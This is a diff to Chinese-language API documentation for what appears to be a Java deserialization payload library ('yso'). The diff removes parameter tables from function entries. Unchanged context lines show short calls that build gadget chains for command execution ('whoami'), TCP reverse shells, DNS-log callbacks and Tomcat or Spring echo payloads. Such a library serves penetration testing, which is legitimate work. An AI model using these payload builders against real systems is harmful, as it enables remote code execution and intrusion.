@@ -2221,17 +2221,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.evilClassName("EvilClass"))
 
 #### 定义
 
-`obfuscationClassConstantPool(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`obfuscationClassConstantPool()`
 
 
 ### springEchoBody
@@ -2241,17 +2231,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.evilClassName("EvilClass"))
 
 #### 定义
 
-`springEchoBody(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`springEchoBody()`
 
 
 ### springHeader
@@ -2326,17 +2306,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam("
 
 #### 定义
 
-`springRuntimeExecAction(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`springRuntimeExecAction()`
 
 
 ### tcpReverseHost
@@ -2446,17 +2416,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHos
 
 #### 定义
 
-`threeBytesCharString(ctx *yserx.MarshalContext) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| ctx | `*yserx.MarshalContext` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`threeBytesCharString()`
 
 
 ### twoBytesCharString
@@ -2466,17 +2426,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHos
 
 #### 定义
 
-`twoBytesCharString(ctx *yserx.MarshalContext) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| ctx | `*yserx.MarshalContext` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`twoBytesCharString()`
 
 
 ### useBase64BytesClass
@@ -2578,17 +2528,7 @@ gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCo
 
 #### 定义
 
-`useClassMultiEchoTemplate(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useClassMultiEchoTemplate()`
 
 
 ### useClassParam
@@ -2619,17 +2559,7 @@ gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCo
 
 #### 定义
 
-`useConstructorExecutor(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useConstructorExecutor()`
 
 
 ### useDNSLogEvilClass
@@ -2669,17 +2599,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useDnslogEvilClass("dnslog.com"))
 
 #### 定义
 
-`useDNSlogTemplate(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useDNSlogTemplate()`
 
 
 ### useEchoBody
@@ -2689,17 +2609,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useDnslogEvilClass("dnslog.com"))
 
 #### 定义
 
-`useEchoBody(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useEchoBody()`
 
 
 ### useHeaderEchoEvilClass
@@ -2709,17 +2619,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useDnslogEvilClass("dnslog.com"))
 
 #### 定义
 
-`useHeaderEchoEvilClass(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useHeaderEchoEvilClass()`
 
 
 ### useHeaderEchoTemplate
@@ -2729,17 +2629,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useDnslogEvilClass("dnslog.com"))
 
 #### 定义
 
-`useHeaderEchoTemplate(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useHeaderEchoTemplate()`
 
 
 ### useHeaderParam
@@ -2784,17 +2674,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader(
 
 #### 定义
 
-`useModifyTomcatMaxHeaderSizeTemplate(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useModifyTomcatMaxHeaderSizeTemplate()`
 
 
 ### useMultiEchoEvilClass
@@ -2804,17 +2684,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader(
 
 #### 定义
 
-`useMultiEchoEvilClass(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useMultiEchoEvilClass()`
 
 
 ### useParam
@@ -2884,17 +2754,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecEvilClass("whoami"))
 
 #### 定义
 
-`useProcessBuilderExecTemplate(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useProcessBuilderExecTemplate()`
 
 
 ### useProcessImplExecEvilClass
@@ -2934,17 +2794,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecEvilClass("whoami"))
 
 #### 定义
 
-`useProcessImplExecTemplate(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useProcessImplExecTemplate()`
 
 
 ### useRuntimeExecEvilClass
@@ -2984,17 +2834,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("whoami"))
 
 #### 定义
 
-`useRuntimeExecTemplate(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useRuntimeExecTemplate()`
 
 
 ### useSleepEvilClass
@@ -3004,17 +2844,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("whoami"))
 
 #### 定义
 
-`useSleepEvilClass(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useSleepEvilClass()`
 
 
 ### useSleepTemplate
@@ -3024,17 +2854,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("whoami"))
 
 #### 定义
 
-`useSleepTemplate(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useSleepTemplate()`
 
 
 ### useSleepTime
@@ -3072,17 +2892,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(),yso.useSleepTime(5)) /
 
 #### 定义
 
-`useSpringEchoTemplate(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useSpringEchoTemplate()`
 
 
 ### useTcpReverseEvilClass
@@ -3165,17 +2975,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellEvilClass(host,8080))
 
 #### 定义
 
-`useTcpReverseShellTemplate(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useTcpReverseShellTemplate()`
 
 
 ### useTcpReverseTemplate
@@ -3185,17 +2985,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellEvilClass(host,8080))
 
 #### 定义
 
-`useTcpReverseTemplate(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useTcpReverseTemplate()`
 
 
 ### useTemplate
@@ -3225,17 +3015,7 @@ yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellEvilClass(host,8080))
 
 #### 定义
 
-`useTomcatEchoEvilClass(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useTomcatEchoEvilClass()`
 
 
 ### useTomcatEchoTemplate
@@ -3245,16 +3025,6 @@ yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellEvilClass(host,8080))
 
 #### 定义
 
-`useTomcatEchoTemplate(config *ClassGenConfig) any`
-
-#### 参数
-|参数名|参数类型|参数解释|
-|:-----------|:---------- |:-----------|
-| config | `*ClassGenConfig` |   |
-
-#### 返回值
-|返回值(顺序)|返回值类型|返回值解释|
-|:-----------|:---------- |:-----------|
-| r1 | `any` |   |
+`useTomcatEchoTemplate()`
 
 
